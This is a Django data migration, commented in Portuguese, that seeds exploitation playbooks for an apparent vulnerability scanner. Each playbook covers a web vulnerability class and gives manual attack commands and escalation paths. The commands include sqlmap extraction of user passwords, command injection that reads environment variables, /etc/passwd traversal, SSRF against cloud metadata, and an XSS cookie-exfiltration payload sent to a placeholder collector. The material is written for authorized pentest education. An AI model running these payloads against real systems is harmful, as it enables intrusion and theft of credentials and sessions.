# Semeia os playbooks de exploração da aba Evidências (Fase 7+).
#
# Migração de dados (não de schema) — versiona o conteúdo curado de
# exploração junto com `migrate`, reproduzível em dev/CI/produção. Cada
# playbook descreve, por classe de vulnerabilidade, COMO explorar manualmente,
# ATÉ ONDE dá para ir (escalação) e COM O QUê — o lado educacional/manual da
# aba. O lado automatizado (o que o Byakugan realmente executou) é `Evidence`.
#
# `key` casa com `Finding.playbook_key` e com o `playbook_key` dos
# `ExploitModule` em apps/scans/exploit/. `category` usa a taxonomia existente
# de FindingCategory. Placeholders {url}/{param}/{host} são interpolados na UI
# com o contexto real do finding.

from django.db import migrations

PLAYBOOKS = [
    {
        "key": "injection.sqli-error",
        "category": "injection",
        "vuln_class": "SQL Injection (baseada em erro)",
        "title": "Explorando SQL Injection baseada em erro",
        "summary": (
            "Quando a entrada do usuário é concatenada diretamente numa consulta SQL, "
            "o banco passa a interpretar caracteres de controle (aspas, comentários) "
            "como parte da query. A partir daí é possível ler dados de qualquer "
            "tabela acessível ao usuário do banco, e às vezes escrever arquivos ou "
            "executar comandos."
        ),
        "prerequisites": (
            "Parâmetro que reflete mensagens de erro do banco ao receber uma aspa "
            "simples (') — indício de concatenação sem parametrização."
        ),
        "steps": [
            {
                "action": "Confirmar a injeção quebrando e reconstruindo a query",
                "command": "curl -sk \"{url}\" --data-urlencode \"{param}=' OR '1'='1\"",
                "expected": "Resposta muda vs. a original; erro de SQL some ao balancear a aspa.",
            },
            {
                "action": "Extrair a versão e o usuário do banco (impacto mínimo, prova de leitura)",
                "command": 'sqlmap -u "{url}" -p {param} --banner --current-user --current-db --batch',
                "expected": "Versão do SGBD, usuário conectado e database atual.",
            },
            {
                "action": "Enumerar tabelas e colunas do schema",
                "command": 'sqlmap -u "{url}" -p {param} --tables --columns --batch',
                "expected": "Lista de tabelas/colunas — mapeia onde estão os dados sensíveis.",
            },
            {
                "action": "Extrair uma amostra de dados para comprovar acesso (não dumpar em massa)",
                "command": 'sqlmap -u "{url}" -p {param} -T users -C username,password --start 1 --stop 3 --batch',
                "expected": "Poucos registros — prova de acesso suficiente para o relatório.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Leitura de metadados",
                "impact": "info-disclosure",
                "description": "Versão, usuário e schema do banco — reconhecimento.",
            },
            {
                "stage": "2. Leitura de dados da aplicação",
                "impact": "db-read",
                "description": "Ler tabelas de usuários, sessões, tokens — vazamento de dados.",
            },
            {
                "stage": "3. Bypass de autenticação",
                "impact": "auth-bypass",
                "description": "Ler/forjar hashes/credenciais para entrar como outro usuário.",
            },
            {
                "stage": "4. Leitura de arquivos / RCE",
                "impact": "rce",
                "description": (
                    "Conforme privilégios do usuário do banco: LOAD_FILE/COPY para ler "
                    "arquivos, INTO OUTFILE ou UDF/xp_cmdshell para chegar a execução de "
                    "comando no host."
                ),
            },
        ],
        "max_impact": "rce",
        "tools": ["sqlmap", "Burp Suite", "curl"],
        "references": [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/89.html",
        ],
    },
    {
        "key": "injection.sqli-boolean",
        "category": "injection",
        "vuln_class": "SQL Injection (booleana/cega)",
        "title": "Explorando SQL Injection cega (boolean-based)",
        "summary": (
            "Mesmo sem mensagens de erro visíveis, quando a resposta muda de forma "
            "consistente entre uma condição verdadeira e uma falsa, é possível "
            "extrair dados bit a bit inferindo o resultado de cada pergunta ao banco."
        ),
        "prerequisites": "Resposta difere entre `AND 1=1` e `AND 1=2` injetados no parâmetro.",
        "steps": [
            {
                "action": "Confirmar o comportamento condicional",
                "command": "curl -sk \"{url}\" --data-urlencode \"{param}=1' AND '1'='1\" ; curl -sk \"{url}\" --data-urlencode \"{param}=1' AND '1'='2\"",
                "expected": "Primeira resposta ~ baseline; segunda difere.",
            },
            {
                "action": "Automatizar a extração cega",
                "command": 'sqlmap -u "{url}" -p {param} --technique=B --current-user --batch',
                "expected": "Dados extraídos por inferência booleana, sem erro no corpo.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Inferência de metadados",
                "impact": "info-disclosure",
                "description": "Versão/usuário do banco extraídos caractere a caractere.",
            },
            {
                "stage": "2. Leitura de dados",
                "impact": "db-read",
                "description": "Extrair credenciais/dados sensíveis, mais lento porém completo.",
            },
            {
                "stage": "3. Bypass de autenticação",
                "impact": "auth-bypass",
                "description": "Recuperar hashes de senha e autenticar como outro usuário.",
            },
        ],
        "max_impact": "db-read",
        "tools": ["sqlmap", "Burp Suite"],
        "references": [
            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
            "https://cwe.mitre.org/data/definitions/89.html",
        ],
    },
    {
        "key": "injection.command-injection",
        "category": "injection",
        "vuln_class": "Command Injection",
        "title": "Explorando Command Injection",
        "summary": (
            "Quando a entrada é passada a um shell do sistema sem sanitização, um "
            "separador de comando (`;`, `|`, `&&`) permite executar comandos "
            "arbitrários no servidor — o caminho mais direto para comprometimento total."
        ),
        "prerequisites": "Parâmetro cuja injeção de `;id` retorna saída de comando (uid=.../gid=...).",
        "steps": [
            {
                "action": "Provar execução com comando inofensivo",
                "command": 'curl -sk "{url}" --data-urlencode "{param}=;id;uname -a"',
                "expected": "Saída de `id` e `uname` na resposta — RCE confirmado.",
            },
            {
                "action": "Enumerar o contexto (usuário, rede, ambiente) — read-only",
                "command": 'curl -sk "{url}" --data-urlencode "{param}=;whoami;hostname;env"',
                "expected": "Usuário do processo, hostname e variáveis de ambiente (podem conter segredos).",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Execução de comando",
                "impact": "rce",
                "description": "Rodar comandos como o usuário do serviço web.",
            },
            {
                "stage": "2. Coleta de segredos",
                "impact": "info-disclosure",
                "description": "Ler env, arquivos de config, chaves de API/DB no host.",
            },
            {
                "stage": "3. Shell interativo",
                "impact": "rce",
                "description": "Estabelecer um shell reverso (em engajamento com essa autorização explícita).",
            },
            {
                "stage": "4. Movimentação lateral / escalação de privilégio",
                "impact": "rce",
                "description": "Pivotar para a rede interna e buscar root — fora do RoE automatizado do Byakugan.",
            },
        ],
        "max_impact": "rce",
        "tools": ["curl", "Burp Suite", "commix"],
        "references": [
            "https://owasp.org/www-community/attacks/Command_Injection",
            "https://cwe.mitre.org/data/definitions/78.html",
        ],
    },
    {
        "key": "injection.ssti",
        "category": "injection",
        "vuln_class": "Server-Side Template Injection (SSTI)",
        "title": "Explorando Server-Side Template Injection",
        "summary": (
            "Quando a entrada do usuário é renderizada como template no servidor "
            "(Jinja2, Twig, FreeMarker...), expressões como `{{7*7}}` são avaliadas. "
            "Dependendo do engine, isso escala de vazamento de dados a execução de "
            "código no servidor."
        ),
        "prerequisites": "Payload `{{7*7}}` ou `${7*7}` retorna `49` na resposta.",
        "steps": [
            {
                "action": "Confirmar avaliação e identificar o engine",
                "command": 'curl -sk "{url}" --data-urlencode "{param}={{7*7}}"',
                "expected": "Resposta contém `49` — o template avaliou a expressão.",
            },
            {
                "action": "Ler objetos internos / config do engine",
                "command": 'curl -sk "{url}" --data-urlencode "{param}={{config}}"',
                "expected": "Config da aplicação (Flask/Jinja2) — pode conter SECRET_KEY.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Avaliação de expressão",
                "impact": "info-disclosure",
                "description": "Ler variáveis/config do template (ex.: SECRET_KEY do Flask).",
            },
            {
                "stage": "2. Leitura de arquivos",
                "impact": "file-read",
                "description": "Acessar objetos do runtime para ler arquivos do servidor.",
            },
            {
                "stage": "3. Execução de código",
                "impact": "rce",
                "description": "Encadear até `os.popen`/`Runtime.exec` conforme o engine — RCE.",
            },
        ],
        "max_impact": "rce",
        "tools": ["tplmap", "Burp Suite", "curl"],
        "references": [
            "https://portswigger.net/research/server-side-template-injection",
            "https://owasp.org/www-project-web-security-testing-guide/",
            "https://cwe.mitre.org/data/definitions/1336.html",
        ],
    },
    {
        "key": "injection.path-traversal",
        "category": "injection",
        "vuln_class": "Path Traversal / Local File Inclusion",
        "title": "Explorando Path Traversal / LFI",
        "summary": (
            "Sequências `../` num parâmetro de arquivo permitem sair do diretório "
            "esperado e ler arquivos arbitrários do servidor — de config a chaves "
            "privadas e credenciais."
        ),
        "prerequisites": "Parâmetro que retorna conteúdo de `/etc/passwd` ao injetar `../`.",
        "steps": [
            {
                "action": "Confirmar leitura de arquivo do sistema",
                "command": 'curl -sk "{url}" --data-urlencode "{param}=../../../../etc/passwd"',
                "expected": "Conteúdo de /etc/passwd (linhas `root:x:0:0:`).",
            },
            {
                "action": "Ler config/segredos da aplicação",
                "command": 'curl -sk "{url}" --data-urlencode "{param}=../../../../etc/hostname"',
                "expected": "Prova adicional de leitura arbitrária; buscar .env, config do app.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Leitura de arquivos do sistema",
                "impact": "file-read",
                "description": "/etc/passwd, /etc/hostname — prova de leitura arbitrária.",
            },
            {
                "stage": "2. Leitura de segredos",
                "impact": "info-disclosure",
                "description": "Config da app, .env, chaves privadas, tokens de deploy.",
            },
            {
                "stage": "3. LFI → RCE",
                "impact": "rce",
                "description": "Log poisoning, /proc/self/environ ou wrappers PHP para executar código.",
            },
        ],
        "max_impact": "rce",
        "tools": ["curl", "Burp Suite", "LFISuite"],
        "references": [
            "https://owasp.org/www-community/attacks/Path_Traversal",
            "https://cwe.mitre.org/data/definitions/22.html",
        ],
    },
    {
        "key": "injection.xss",
        "category": "injection",
        "vuln_class": "Cross-Site Scripting (refletido)",
        "title": "Explorando XSS refletido",
        "summary": (
            "Quando a entrada volta na página sem codificação HTML, é possível "
            "injetar script que executa no navegador da vítima — roubando sessão, "
            "credenciais ou realizando ações em nome dela."
        ),
        "prerequisites": "Marcador HTML injetado no parâmetro reflete sem escape na resposta.",
        "steps": [
            {
                "action": "Confirmar a reflexão sem escape",
                "command": 'curl -sk "{url}" --data-urlencode "{param}=<b>byk</b>"',
                "expected": "A tag <b> aparece intacta no HTML — o contexto não escapa.",
            },
            {
                "action": "Montar PoC de exfiltração de cookie (em lab autorizado)",
                "command": "payload: <script>new Image().src='//SEU-COLETOR/?c='+document.cookie</script>",
                "expected": "Cookie de sessão chega ao coletor — comprova roubo de sessão.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Execução de script",
                "impact": "session",
                "description": "JS arbitrário no contexto do domínio da vítima.",
            },
            {
                "stage": "2. Roubo de sessão",
                "impact": "session",
                "description": "Exfiltrar cookies (sem HttpOnly) → sequestro de sessão.",
            },
            {
                "stage": "3. Account takeover",
                "impact": "auth-bypass",
                "description": "Ações autenticadas em nome da vítima, troca de senha/e-mail.",
            },
        ],
        "max_impact": "session",
        "tools": ["Burp Suite", "XSS Hunter", "curl"],
        "references": [
            "https://owasp.org/www-community/attacks/xss/",
            "https://cwe.mitre.org/data/definitions/79.html",
        ],
    },
    {
        "key": "injection.ssrf",
        "category": "injection",
        "vuln_class": "Server-Side Request Forgery (SSRF)",
        "title": "Explorando SSRF",
        "summary": (
            "Quando o servidor busca uma URL controlada pelo usuário, é possível "
            "fazê-lo acessar recursos internos inalcançáveis de fora — endpoints de "
            "metadata de nuvem, serviços internos, e a própria loopback."
        ),
        "prerequisites": "Parâmetro de URL cujo destino é buscado pelo servidor.",
        "steps": [
            {
                "action": "Apontar para a metadata da nuvem (read-only)",
                "command": 'curl -sk "{url}" --data-urlencode "{param}=http://169.254.169.254/latest/meta-data/"',
                "expected": "Listagem de metadata da instância (AWS/GCP/Azure).",
            },
            {
                "action": "Enumerar serviços internos / loopback",
                "command": 'curl -sk "{url}" --data-urlencode "{param}=http://127.0.0.1:6379/"',
                "expected": "Resposta de serviço interno não exposto externamente.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Acesso a rede interna",
                "impact": "ssrf",
                "description": "Alcançar loopback e sub-redes internas via o servidor.",
            },
            {
                "stage": "2. Roubo de credenciais de nuvem",
                "impact": "info-disclosure",
                "description": "Ler IAM role credentials do endpoint de metadata (169.254.169.254).",
            },
            {
                "stage": "3. Pivô / RCE",
                "impact": "rce",
                "description": "Usar as credenciais/serviços internos para escalar — fora do RoE automatizado.",
            },
        ],
        "max_impact": "ssrf",
        "tools": ["Burp Collaborator", "curl", "Gopherus"],
        "references": [
            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            "https://cwe.mitre.org/data/definitions/918.html",
        ],
    },
    {
        "key": "injection.open-redirect",
        "category": "injection",
        "vuln_class": "Open Redirect",
        "title": "Explorando Open Redirect",
        "summary": (
            "Quando um parâmetro controla o destino de um redirecionamento sem "
            "validação, um atacante usa a URL confiável para levar a vítima a um "
            "site malicioso — base para phishing e roubo de tokens OAuth."
        ),
        "prerequisites": "Parâmetro que redireciona (3xx) para um domínio externo injetado.",
        "steps": [
            {
                "action": "Confirmar o redirect para domínio externo",
                "command": 'curl -skI "{url}" --data-urlencode "{param}=//exemplo-malicioso.invalid/"',
                "expected": "Header `Location:` aponta para o domínio externo.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Redirecionamento controlado",
                "impact": "session",
                "description": "Levar a vítima a um site atacante a partir de URL confiável.",
            },
            {
                "stage": "2. Phishing / roubo de token",
                "impact": "auth-bypass",
                "description": "Capturar credenciais ou código/token OAuth via redirect_uri.",
            },
        ],
        "max_impact": "auth-bypass",
        "tools": ["curl", "Burp Suite"],
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/601.html",
        ],
    },
    {
        "key": "credential.default",
        "category": "credential",
        "vuln_class": "Credenciais default/fracas",
        "title": "Explorando credenciais padrão",
        "summary": (
            "Serviços mantendo credenciais de fábrica (admin/admin, sem senha) ou "
            "acesso anônimo dão ao atacante acesso autenticado imediato, muitas "
            "vezes administrativo."
        ),
        "prerequisites": "Serviço que aceitou uma credencial default detectada pelo scan.",
        "steps": [
            {
                "action": "Autenticar com a credencial detectada",
                "command": 'curl -sk -u admin:admin "{url}"',
                "expected": "Acesso autenticado (200 + conteúdo restrito).",
            },
            {
                "action": "Enumerar o que a conta acessa (sem alterar)",
                "command": 'curl -sk -u admin:admin "{url}" | head',
                "expected": "Painéis/dados acessíveis — dimensiona o impacto.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Acesso autenticado",
                "impact": "auth-bypass",
                "description": "Entrar no serviço com a conta padrão.",
            },
            {
                "stage": "2. Acesso administrativo",
                "impact": "auth-bypass",
                "description": "Contas default costumam ser admin — controle do serviço.",
            },
            {
                "stage": "3. RCE / pivô",
                "impact": "rce",
                "description": "Muitos painéis admin (Actuator, Jenkins, Tomcat Manager) levam a RCE.",
            },
        ],
        "max_impact": "rce",
        "tools": ["hydra", "curl", "Metasploit"],
        "references": [
            "https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures/",
            "https://cwe.mitre.org/data/definitions/1392.html",
        ],
    },
    {
        "key": "exposure.git",
        "category": "exposure",
        "vuln_class": "Repositório .git exposto",
        "title": "Explorando um diretório .git exposto",
        "summary": (
            "Um `.git/` servido pela web permite reconstruir o código-fonte completo "
            "da aplicação e todo o seu histórico — frequentemente incluindo segredos "
            "commitados por engano."
        ),
        "prerequisites": "`/.git/config` ou `/.git/HEAD` acessível via HTTP.",
        "steps": [
            {
                "action": "Confirmar a exposição",
                "command": 'curl -sk "{host}/.git/HEAD"',
                "expected": "`ref: refs/heads/...` — o diretório .git está servido.",
            },
            {
                "action": "Reconstruir o repositório e caçar segredos",
                "command": "git-dumper \"{host}/.git/\" ./loot && git -C ./loot log -p | grep -iE 'password|secret|api[_-]?key'",
                "expected": "Código-fonte + histórico; segredos commitados no passado.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Vazamento de código-fonte",
                "impact": "info-disclosure",
                "description": "Reconstruir a aplicação a partir dos objetos do .git.",
            },
            {
                "stage": "2. Extração de segredos",
                "impact": "info-disclosure",
                "description": "Chaves de API, credenciais de DB, tokens no histórico de commits.",
            },
            {
                "stage": "3. Uso dos segredos",
                "impact": "auth-bypass",
                "description": "Autenticar em serviços cloud/DB com as credenciais vazadas.",
            },
        ],
        "max_impact": "info-disclosure",
        "tools": ["git-dumper", "GitTools", "curl"],
        "references": [
            "https://owasp.org/www-project-web-security-testing-guide/",
            "https://cwe.mitre.org/data/definitions/527.html",
        ],
    },
    {
        "key": "exposure.env",
        "category": "exposure",
        "vuln_class": "Arquivo de segredos exposto (.env)",
        "title": "Explorando um arquivo .env exposto",
        "summary": (
            "Arquivos `.env`/config servidos pela web entregam diretamente as "
            "credenciais da aplicação: senha do banco, chaves de API, chaves de "
            "assinatura de sessão."
        ),
        "prerequisites": "`/.env` (ou similar) acessível e com pares CHAVE=valor.",
        "steps": [
            {
                "action": "Ler o arquivo e identificar segredos",
                "command": 'curl -sk "{host}/.env"',
                "expected": "DB_PASSWORD, APP_KEY, AWS_*, tokens de terceiros.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Vazamento de credenciais",
                "impact": "info-disclosure",
                "description": "Todas as chaves da aplicação num único arquivo.",
            },
            {
                "stage": "2. Acesso direto a banco/serviços",
                "impact": "db-read",
                "description": "Conectar ao DB ou APIs cloud com as credenciais expostas.",
            },
            {
                "stage": "3. Forja de sessão / RCE",
                "impact": "auth-bypass",
                "description": "APP_KEY/SECRET permite forjar cookies de sessão assinados.",
            },
        ],
        "max_impact": "db-read",
        "tools": ["curl"],
        "references": [
            "https://cwe.mitre.org/data/definitions/312.html",
            "https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration/",
        ],
    },
    {
        "key": "exposure.actuator",
        "category": "exposure",
        "vuln_class": "Spring Boot Actuator exposto",
        "title": "Explorando Spring Boot Actuator",
        "summary": (
            "Endpoints Actuator expostos (`/actuator/env`, `/heapdump`, "
            "`/actuator/gateway`) vazam configuração, variáveis de ambiente e às "
            "vezes permitem escrita de propriedades que levam a RCE."
        ),
        "prerequisites": "`/actuator` ou `/actuator/health` acessível sem autenticação.",
        "steps": [
            {
                "action": "Enumerar os endpoints disponíveis",
                "command": 'curl -sk "{host}/actuator"',
                "expected": "Lista de links: env, health, mappings, heapdump...",
            },
            {
                "action": "Vazar variáveis de ambiente/segredos",
                "command": 'curl -sk "{host}/actuator/env"',
                "expected": "Propriedades e env, potencialmente com credenciais.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Vazamento de config",
                "impact": "info-disclosure",
                "description": "env, mappings e beans expostos.",
            },
            {
                "stage": "2. Roubo de sessão via heapdump",
                "impact": "session",
                "description": "/heapdump contém tokens e sessões em memória.",
            },
            {
                "stage": "3. RCE",
                "impact": "rce",
                "description": "env POST + refresh, ou gateway actuator, para execução de código.",
            },
        ],
        "max_impact": "rce",
        "tools": ["curl", "actuator-tester", "Burp Suite"],
        "references": [
            "https://cwe.mitre.org/data/definitions/200.html",
            "https://owasp.org/www-project-web-security-testing-guide/",
        ],
    },
    {
        "key": "cors.misconfig",
        "category": "cors",
        "vuln_class": "CORS mal configurado",
        "title": "Explorando CORS permissivo",
        "summary": (
            "Quando o servidor reflete qualquer Origin com "
            "`Access-Control-Allow-Credentials: true`, um site atacante consegue ler "
            "respostas autenticadas da vítima cross-origin."
        ),
        "prerequisites": "Servidor reflete uma Origin arbitrária no ACAO com credenciais.",
        "steps": [
            {
                "action": "Confirmar a reflexão da Origin",
                "command": 'curl -sk -H "Origin: https://atacante.invalid" -I "{url}"',
                "expected": "`Access-Control-Allow-Origin: https://atacante.invalid` + credentials:true.",
            },
            {
                "action": "PoC: ler dado autenticado cross-origin",
                "command": "fetch('{url}',{credentials:'include'}).then(r=>r.text()).then(exfil)",
                "expected": "Resposta autenticada da vítima lida pelo domínio atacante.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Leitura cross-origin",
                "impact": "session",
                "description": "Ler respostas autenticadas da vítima de outro domínio.",
            },
            {
                "stage": "2. Roubo de dados/token",
                "impact": "info-disclosure",
                "description": "Exfiltrar perfil, tokens CSRF, dados de API do usuário logado.",
            },
        ],
        "max_impact": "session",
        "tools": ["curl", "Burp Suite", "CORScanner"],
        "references": [
            "https://portswigger.net/web-security/cors",
            "https://cwe.mitre.org/data/definitions/942.html",
        ],
    },
    {
        "key": "dns.zone-transfer",
        "category": "dns",
        "vuln_class": "Transferência de zona DNS (AXFR)",
        "title": "Explorando transferência de zona DNS",
        "summary": (
            "Um servidor DNS que aceita AXFR de qualquer cliente entrega a lista "
            "completa de registros da zona — um mapa de toda a superfície de ataque "
            "interna e externa."
        ),
        "prerequisites": "Servidor NS autoritativo aceitando AXFR sem restrição.",
        "steps": [
            {
                "action": "Solicitar a zona completa",
                "command": "dig AXFR {host} @<nameserver>",
                "expected": "Todos os registros da zona (hosts internos, dev, staging...).",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Mapa da infraestrutura",
                "impact": "info-disclosure",
                "description": "Enumerar subdomínios, hosts internos e serviços ocultos.",
            },
            {
                "stage": "2. Alvos direcionados",
                "impact": "info-disclosure",
                "description": "Atacar hosts de dev/staging normalmente menos protegidos.",
            },
        ],
        "max_impact": "info-disclosure",
        "tools": ["dig", "dnsrecon", "fierce"],
        "references": [
            "https://cwe.mitre.org/data/definitions/200.html",
            "https://owasp.org/www-project-web-security-testing-guide/",
        ],
    },
    {
        "key": "subdomain.takeover",
        "category": "subdomain",
        "vuln_class": "Subdomain Takeover",
        "title": "Explorando Subdomain Takeover",
        "summary": (
            "Um subdomínio com CNAME apontando para um serviço de terceiro "
            "desprovisionado (S3, GitHub Pages, Heroku...) pode ser reivindicado pelo "
            "atacante, que passa a servir conteúdo no domínio confiável da vítima."
        ),
        "prerequisites": "CNAME pendente para um provedor com página de 'não reivindicado'.",
        "steps": [
            {
                "action": "Confirmar o CNAME pendente",
                "command": "dig CNAME {host}",
                "expected": "Aponta para um provedor cuja resposta indica recurso inexistente.",
            },
            {
                "action": "Reivindicar o recurso no provedor",
                "command": "(criar o bucket/app com o nome esperado no provedor de terceiro)",
                "expected": "O subdomínio passa a servir conteúdo do atacante.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Controle do subdomínio",
                "impact": "session",
                "description": "Servir conteúdo arbitrário sob o domínio confiável.",
            },
            {
                "stage": "2. Roubo de sessão/cookies",
                "impact": "session",
                "description": "Cookies de escopo de domínio pai vazam para o subdomínio controlado.",
            },
            {
                "stage": "3. Phishing com TLS válido",
                "impact": "auth-bypass",
                "description": "Página de login idêntica sob o domínio real da organização.",
            },
        ],
        "max_impact": "auth-bypass",
        "tools": ["subjack", "nuclei", "dig"],
        "references": [
            "https://owasp.org/www-project-web-security-testing-guide/",
            "https://cwe.mitre.org/data/definitions/350.html",
        ],
    },
]


def seed_playbooks(apps, schema_editor):
    ExploitationPlaybook = apps.get_model("scans", "ExploitationPlaybook")
    for pb in PLAYBOOKS:
        ExploitationPlaybook.objects.update_or_create(
            key=pb["key"],
            defaults={k: v for k, v in pb.items() if k != "key"},
        )


def remove_playbooks(apps, schema_editor):
    ExploitationPlaybook = apps.get_model("scans", "ExploitationPlaybook")
    ExploitationPlaybook.objects.filter(key__in=[p["key"] for p in PLAYBOOKS]).delete()


class Migration(migrations.Migration):

    dependencies = [
        ("scans", "0005_exploitationplaybook_finding_playbook_key_evidence"),
    ]

    operations = [migrations.RunPython(seed_playbooks, remove_playbooks)]
